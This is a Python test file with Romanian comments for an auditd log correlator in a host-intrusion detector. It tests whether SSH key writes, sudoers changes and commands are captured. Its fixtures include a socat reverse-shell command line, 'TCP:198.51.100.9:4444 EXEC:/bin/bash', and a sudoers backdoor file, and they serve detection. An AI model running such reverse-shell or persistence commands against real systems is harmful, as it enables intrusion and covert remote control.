"""Corelatorul auditd: SYSCALL + PATH + EXECVE.

Regulile din deploy/audit/sentinel.rules supravegheau exact semnalele de
post-compromitere — chei SSH, sudoers, cron, unități systemd, webroot, nc/socat
— iar colectorul arunca tipurile de înregistrări pe care le produc. Kernelul
scria, audit.log conținea, baza de date nu vedea nimic.

Liniile din fixture-uri sunt copiate din formatul real auditd de pe RHEL 9.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from sentinel.collectors.auditd import (parse_auditd, parse_auditd_group,
                                        parse_auditd_lines)

REPO = Path(__file__).resolve().parents[2]

# O cheie SSH scrisă în /root/.ssh — semnalul de persistență numărul unu.
SSH_KEY_WRITE = [
    'type=SYSCALL msg=audit(1754390000.123:8801): arch=c000003e syscall=257 '
    'success=yes exit=3 a0=ffffff9c a1=7ffd0 a2=241 a3=1b6 items=2 ppid=4210 '
    'pid=4877 auid=1000 uid=0 gid=0 euid=0 comm="tee" exe="/usr/bin/tee" '
    'subj=unconfined key="sentinel_ssh"',
    'type=CWD msg=audit(1754390000.123:8801): cwd="/tmp"',
    'type=PATH msg=audit(1754390000.123:8801): item=0 name="/root/.ssh" '
    'inode=131 dev=fd:00 mode=040700 ouid=0 ogid=0 nametype=PARENT',
    'type=PATH msg=audit(1754390000.123:8801): item=1 '
    'name="/root/.ssh/authorized_keys" inode=0 mode=0100600 ouid=0 ogid=0 '
    'nametype=CREATE',
    'type=PROCTITLE msg=audit(1754390000.123:8801): proctitle=746565',
]

SOCAT_EXEC = [
    'type=SYSCALL msg=audit(1754390100.456:8900): arch=c000003e syscall=59 '
    'success=yes exit=0 items=2 ppid=3300 pid=5001 auid=1000 uid=1000 '
    'comm="socat" exe="/usr/bin/socat" key="sentinel_exec"',
    'type=EXECVE msg=audit(1754390100.456:8900): argc=3 a0="socat" '
    'a1="TCP:198.51.100.9:4444" a2="EXEC:/bin/bash"',
    'type=PATH msg=audit(1754390100.456:8900): item=0 name="/usr/bin/socat" '
    'nametype=NORMAL',
]

SUDOERS_WRITE = [
    'type=SYSCALL msg=audit(1754390200.001:9000): arch=c000003e syscall=257 '
    'success=yes exit=4 items=2 ppid=1 pid=6100 auid=1000 uid=0 comm="vim" '
    'exe="/usr/bin/vim" key="sentinel_priv"',
    'type=PATH msg=audit(1754390200.001:9000): item=1 '
    'name="/etc/sudoers.d/backdoor" nametype=CREATE',
]

# Regula altcuiva de pe aceeași gazdă. Nu e a noastră, nu ne privește.
FOREIGN_RULE = [
    'type=SYSCALL msg=audit(1754390300.777:9100): arch=c000003e syscall=257 '
    'success=yes exit=5 pid=7000 auid=0 uid=0 comm="logrotate" '
    'exe="/usr/sbin/logrotate" key="distro_something"',
    'type=PATH msg=audit(1754390300.777:9100): item=0 name="/var/log/x" '
    'nametype=NORMAL',
]

# Fără cheie deloc: marea majoritate a traficului auditd pe o gazdă obișnuită.
UNKEYED = [
    'type=SYSCALL msg=audit(1754390400.000:9200): arch=c000003e syscall=2 '
    'success=yes exit=3 pid=8000 auid=0 uid=0 comm="sshd" exe="/usr/sbin/sshd"',
    'type=PATH msg=audit(1754390400.000:9200): item=0 name="/etc/hosts" '
    'nametype=NORMAL',
]


# --- ce se păstrează și ce nu ---------------------------------------------
def test_a_key_written_into_root_ssh_becomes_an_event():
    ev = parse_auditd_group(SSH_KEY_WRITE)
    assert ev is not None, "scrierea unei chei SSH nu are voie să fie aruncată"
    assert ev.source == "auditd"
    assert ev.action == "ssh_key_change"
    assert ev.file_path == "/root/.ssh/authorized_keys"
    assert ev.process == "/usr/bin/tee"
    assert ev.raw["audit_key"] == "sentinel_ssh"


def test_the_target_file_wins_over_its_parent_directory():
    """Un syscall raportează și directorul, și fișierul. Fără preferința pe
    nametype, jumătate din alerte ar arăta „/root/.ssh" în loc de fișierul
    chiar atins — adevărat, dar inutil."""
    ev = parse_auditd_group(SSH_KEY_WRITE)
    assert ev.file_path.endswith("authorized_keys")
    assert ev.raw["paths"][0] == "/root/.ssh"      # păstrat ca dovadă
    assert len(ev.raw["paths"]) == 2


def test_the_executed_command_line_is_kept():
    """`socat TCP:...:4444 EXEC:/bin/bash` — argumentele SUNT alerta. Fără ele
    rămâne „cineva a rulat socat", ceea ce nu deosebește un reverse shell de
    un script de administrare."""
    ev = parse_auditd_group(SOCAT_EXEC)
    assert ev.action == "suspicious_exec"
    assert "4444" in ev.raw["argv"]
    assert "EXEC:/bin/bash" in ev.raw["argv"]


def test_sudoers_modification_is_captured():
    ev = parse_auditd_group(SUDOERS_WRITE)
    assert ev.action == "sudoers_change"
    assert ev.file_path == "/etc/sudoers.d/backdoor"


@pytest.mark.parametrize("group", [FOREIGN_RULE, UNKEYED], ids=["altă regulă", "fără cheie"])
def test_records_that_are_not_ours_are_dropped(group):
    """Filtrul strict pe `sentinel_*` e ce ține promisiunea din antetul
    modulului: auditd poate produce mii de înregistrări pe secundă, iar o
    ingestie nefiltrată e același pericol de umplere a discului."""
    assert parse_auditd_group(group) is None


def test_auid_is_preferred_over_uid():
    """După `sudo su -`, uid e 0 și auid rămâne cine s-a autentificat. La
    întrebarea „cine a făcut asta", uid minte."""
    ev = parse_auditd_group(SSH_KEY_WRITE)
    assert ev.username == "1000"
    assert ev.raw["uid"] == "0"


def test_unset_auid_does_not_become_a_username():
    lines = [SSH_KEY_WRITE[0].replace("auid=1000", "auid=4294967295"),
             SSH_KEY_WRITE[3]]
    assert parse_auditd_group(lines).username is None


# --- gruparea pe lot ------------------------------------------------------
def test_lines_are_grouped_by_serial():
    mixed = UNKEYED + SSH_KEY_WRITE + FOREIGN_RULE + SOCAT_EXEC
    evs = parse_auditd_lines(mixed)
    assert [e.action for e in evs] == ["ssh_key_change", "suspicious_exec"]


def test_single_line_types_still_parse_unchanged():
    """USER_AUTH și rudele au semantică de sine stătătoare și treceau deja.
    Corelatorul nu are voie să le piardă."""
    line = ('type=USER_AUTH msg=audit(1754390500.000:9300): pid=1 uid=0 '
            'auid=4294967295 msg=\'op=PAM:authentication acct="root" '
            'exe="/usr/sbin/sshd" hostname=203.0.113.9 addr=203.0.113.9 '
            'terminal=ssh res=failed\'')
    direct = parse_auditd(line)
    assert direct is not None and direct.action == "auth_fail"
    assert [e.action for e in parse_auditd_lines([line])] == ["auth_fail"]


def test_a_group_split_across_reads_does_not_raise():
    """Tailerul citește pe bucăți; un grup se poate rupe la mijloc. Rezultatul
    acceptabil e un eveniment fără cale, nu o excepție și nu o linie pierdută."""
    ev = parse_auditd_group([SSH_KEY_WRITE[0]])
    assert ev is not None and ev.file_path is None
    assert parse_auditd_group(SSH_KEY_WRITE[2:]) is None


# --- legătura cu regulile chiar instalate ---------------------------------
def test_every_audit_rule_key_has_a_mapping():
    """Fiecare `-k` din fișierul de reguli trebuie să aibă traducere în
    colector. O cheie fără mapare e o regulă care rulează pe server, umple
    audit.log și nu produce niciodată nimic — exact situația reparată aici."""
    from sentinel.collectors.auditd import _WATCH_KEYS
    rules = (REPO / "deploy" / "audit" / "sentinel.rules").read_text(encoding="utf-8")
    keys = set()
    for line in rules.splitlines():
        for token in line.split():
            if token.startswith("-k") and token != "-k":
                keys.add(token[2:])
            elif token.startswith("key="):
                keys.add(token[4:])
        if " -k " in line:
            keys.add(line.split(" -k ")[1].split()[0])
    sentinel_keys = {k for k in keys if k.startswith("sentinel_")}
    assert sentinel_keys, "nu am găsit nicio cheie în fișierul de reguli"
    missing = sentinel_keys - set(_WATCH_KEYS)
    assert not missing, f"chei de audit fără mapare în colector: {sorted(missing)}"
